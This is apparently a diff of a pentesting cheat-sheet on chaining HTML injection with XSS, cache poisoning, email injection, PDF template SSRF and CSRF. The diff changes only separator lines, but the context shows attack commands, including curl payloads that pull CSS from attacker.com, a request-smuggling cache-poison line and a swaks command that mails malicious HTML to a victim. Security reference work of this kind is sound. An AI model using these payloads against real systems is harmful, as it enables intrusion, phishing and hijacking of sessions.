@@ -20,7 +20,7 @@ linked:
 ---
 # HTML Injection - Chains con Otras Vulns
 
-***
+---
 
 ## HTML to XSS Upgrade
 
@@ -43,7 +43,7 @@ linked:
 | `curl 'https://target/?q=<style>@import url("https://attacker.com/x.css")</style>'` (sin script-src CSP) | CSS @import chain | CSP gap. |
 ^htmli-chain-xss
 
-___
+---
 
 ## Cache Poisoning Combo
 
@@ -62,7 +62,7 @@ ___
 | `curl -H "X-Forwarded-Host: attacker.com" -H "Transfer-Encoding: chunked" --data-binary @smuggle.txt https://target/` (CL.TE smuggle + cache) | Smuggle response cache poison HTML inject | HRS combo. |
 ^htmli-chain-cache
 
-___
+---
 
 ## HTML Email Injection
 
@@ -81,7 +81,7 @@ ___
 | `python3 swaks --to victim@target.com --from "attacker@attacker.com" --header "Subject: Update" --body @malicious.html` | Direct swaks test email send | Manual test. |
 ^htmli-chain-email
 
-___
+---
 
 ## PDF / Print Template Injection
 
@@ -111,7 +111,7 @@ ___
 
 Send to PDF generator endpoint. Engine loads `file://` and `http://` internal URLs. Resultados aparecen en PDF generado.
 
-___
+---
 
 ## CSRF + HTML Injection Chain
 
@@ -129,4 +129,4 @@ ___
 | `curl -X POST -d 'sig=<img src="https://target.com/api/refresh?action=extend">' https://target/profile` (stored signature) | Stored CSRF session-extension | Persistent CSRF. |
 ^htmli-chain-csrf
 
-***
+---
